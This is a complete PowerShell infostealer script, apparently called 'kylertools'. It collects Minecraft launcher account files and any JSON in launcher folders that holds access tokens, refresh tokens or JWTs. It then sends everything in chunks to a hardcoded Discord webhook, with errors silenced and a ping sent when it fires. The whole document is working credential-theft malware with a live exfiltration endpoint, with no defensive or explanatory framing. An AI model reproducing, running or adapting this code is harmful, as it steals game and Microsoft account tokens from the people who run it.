$webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
$h = @{ "Content-Type" = "application/json" }

# test ping so u know it fired
try{
    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
}catch{}

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.minecraft\launcher_msa_credentials.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_msa_credentials.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\gdlauncher_carbon\data\gdl_conf.db",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json"
)

$found = @()

foreach($p in $paths){
    if(Test-Path $p){
        try{
            $j = Get-Content $p -Raw
            $found += "=== $p ===`n$j`n"
        }catch{}
    }
}

# targeted subfolder scan instead of all appdata
$roots = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.lunarclient",
    "$env:APPDATA\ModrinthApp",
    "$env:APPDATA\PrismLauncher",
    "$env:APPDATA\MultiMC",
    "$env:APPDATA\xmcl",
    "$env:APPDATA\.technic",
    "$env:APPDATA\.feather"
)

foreach($r in $roots){
    if(Test-Path $r){
        try{
            Get-ChildItem $r -Recurse -File -Include "*.json" -EA 0 | %{
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                if($c -match "accessToken|refreshToken|eyJhbGciOi"){
                    $found += "=== $($_.FullName) ===`n$c`n"
                }
            }
        }catch{}
    }
}

# dedupe
$found = $found | Select-Object -Unique

if($found.Count -eq 0){
    $found = "nothin found bro"
}

$joined = $found -join "`n"

$limit = 1800
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){
    $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
}

$n = 0
foreach($c in $chunks){
    $n++
    $embed = @{
        title = "mc tokens"
        description = "``````$c``````"
        color = 5793266
        footer = @{ text = "kylertools | part $n/$($chunks.Count)" }
        timestamp = (Get-Date).ToString("o")
    }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null }catch{}
    Start-Sleep -Milliseconds 900
}
